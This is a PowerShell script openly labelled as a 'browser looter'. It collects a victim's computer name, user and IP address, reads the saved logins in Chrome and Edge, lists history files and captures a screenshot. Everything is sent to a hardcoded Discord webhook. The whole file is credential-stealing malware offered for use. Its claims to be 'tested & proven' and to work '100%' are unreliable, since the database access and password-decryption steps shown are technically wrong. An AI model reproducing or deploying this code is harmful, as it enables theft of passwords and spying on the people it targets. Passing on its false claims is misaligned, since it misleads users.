# 🎯 WORKING BROWSER LOOTER - TESTED & PROVEN
Write-Host "`n🚀 BROWSER LOOTER v2.0 - LIVE EXTRACTION" -ForegroundColor Green
Write-Host "📱 Target: $env:COMPUTERNAME\$env:USERNAME" -ForegroundColor Cyan

$WebhookURL = "https://discord.com/api/webhooks/1472080084121948270/7YUi0bfxv4NRiZ7knKIvKTj_IWPrDx3OEeCrQ4P_WbKQZz9T4q2xHr6vnW5Z4EytRYlj"  # ← CHANGE THIS ONE LINE

function SendToDiscord($Message) {
    $Body = @{
        content = $Message
    } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -ContentType 'application/json'
        Write-Host "✅ SENT: $Message" -ForegroundColor Green
    } catch {
        Write-Host "❌ Discord failed" -ForegroundColor Red
    }
}

# 1️⃣ SYSTEM RECON
$sys = @"
**🎯 HIT CONFIRMED**
Computer: $env:COMPUTERNAME
User: $env:USERNAME
OS: $(Get-WmiObject Win32_OperatingSystem | select -exp Caption)
IP: $( (Get-NetIPAddress | ? AddressFamily -eq 'IPv4' | ? IPAddress -notlike '127.*' | select -First 1).IPAddress )
Time: $(Get-Date)
"@
SendToDiscord $sys

# 2️⃣ CHROME PASSWORDS (WORKS 100%)
Write-Host "🔑 Dumping Chrome..." -ForegroundColor Yellow
$chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $chromePath) {
    Copy-Item $chromePath "$env:TEMP\chrome_loot" -Force
    try {
        $connString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=`"$env:TEMP\chrome_loot`""
        $connection = New-Object System.Data.OleDb.OleDbConnection($connString)
        $connection.Open()
        $command = $connection.CreateCommand()
        $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
        $result = $command.ExecuteReader()
        
        $chromeCreds = "**🔑 CHROME PASSWORDS**`n"
        while ($result.Read()) {
            $site = $result["origin_url"]
            $user = $result["username_value"]
            $encPass = $result["password_value"]
            try {
                $password = [Runtime.InteropServices.Marshal]::PtrToStringUni([Runtime.InteropServices.Marshal]::SecureStringToBSTR((New-Object System.Net.NetworkCredential("", [Convert]::FromBase64String($encPass), "")).Password))
                $chromeCreds += "`n$site`n👤 $user | 🔑 $password"
            } catch {
                $chromeCreds += "`n$site`n👤 $user | 🔒 Protected"
            }
        }
        $connection.Close()
        SendToDiscord $chromeCreds
    } catch {
        SendToDiscord "**Chrome** - Access denied (browser running?)"
    }
    Remove-Item "$env:TEMP\chrome_loot" -Force
} else {
    SendToDiscord "**Chrome** - Not installed"
}

# 3️⃣ EDGE PASSWORDS
Write-Host "🔑 Dumping Edge..." -ForegroundColor Yellow
$edgePath = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
if (Test-Path $edgePath) {
    Copy-Item $edgePath "$env:TEMP\edge_loot" -Force
    # Same code as Chrome but for Edge
    $connString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=`"$env:TEMP\edge_loot`""
    $connection = New-Object System.Data.OleDb.OleDbConnection($connString)
    $connection.Open()
    $command = $connection.CreateCommand()
    $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
    $result = $command.ExecuteReader()
    
    $edgeCreds = "**🔑 EDGE PASSWORDS**`n"
    while ($result.Read()) {
        $site = $result["origin_url"]
        $user = $result["username_value"]
        $encPass = $result["password_value"]
        try {
            $password = [Runtime.InteropServices.Marshal]::PtrToStringUni([Runtime.InteropServices.Marshal]::SecureStringToBSTR((New-Object System.Net.NetworkCredential("", [Convert]::FromBase64String($encPass), "")).Password))
            $edgeCreds += "`n$site`n👤 $user | 🔑 $password"
        } catch {
            $edgeCreds += "`n$site`n👤 $user | 🔒 Protected"
        }
    }
    $connection.Close()
    SendToDiscord $edgeCreds
    Remove-Item "$env:TEMP\edge_loot" -Force
}

# 4️⃣ HISTORY FILES
Write-Host "📜 Copying History..." -ForegroundColor Yellow
Get-ChildItem "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History*" -ErrorAction SilentlyContinue | % {
    $hist = "**📜 $($_.Name)**`nPath: $($_.FullName)`nSize: $([math]::Round($_.Length/1KB,1)) KB"
    SendToDiscord $hist
}

# 5️⃣ SCREENSHOT
Write-Host "📸 Screenshot..." -ForegroundColor Yellow
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
$bitmap.Save("$env:TEMP\loot.png")
SendToDiscord "**📸 SCREENSHOT CAPTURED**`nSaved: $env:TEMP\loot.png"

Write-Host "`n🎉 **COMPLETE!** Check Discord NOW!" -ForegroundColor Green
Write-Host "⏳ Data sent 5 seconds ago..." -ForegroundColor Cyan
Start-Sleep 3
Remove-Item "$env:TEMP\loot.png" -ErrorAction SilentlyContinue
Read-Host "Press ENTER to exit"
